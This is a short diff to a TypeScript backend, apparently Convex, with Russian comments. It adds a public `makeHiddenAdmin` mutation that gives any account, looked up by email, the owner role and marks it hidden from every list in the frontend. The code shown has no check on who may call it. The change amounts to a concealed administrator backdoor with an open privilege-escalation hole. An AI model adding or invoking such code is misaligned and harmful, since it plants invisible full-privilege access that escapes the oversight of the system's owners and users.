@@ -125,6 +125,22 @@ export const recolorAvatars = mutation({
   },
 })
 
+// Сделать аккаунт скрытым владельцем (служебный/разработчик): полный доступ
+// по роли owner, но невидим во всех списках фронта. Вход и роль работают
+// (currentEmployee/isInvited матчат по email независимо от hidden).
+export const makeHiddenAdmin = mutation({
+  args: { email: v.string() },
+  handler: async (ctx, { email }) => {
+    const e = await ctx.db
+      .query('employees')
+      .withIndex('by_email', (q) => q.eq('email', email.toLowerCase().trim()))
+      .first()
+    if (!e) throw new Error('Сотрудник не найден: ' + email)
+    await ctx.db.patch(e._id, { role: 'owner', hidden: true })
+    return { updated: e.name, email: e.email }
+  },
+})
+
 // Сброс команды под реальный старт: стирает демо-данные (задачи, кампании,
 // SMM-метрики, ежедневные отчёты, входы) и старых сотрудников, создаёт
 // реальную стартовую команду (владелец + AI-разработчик). Auth-таблицы не трогаем.
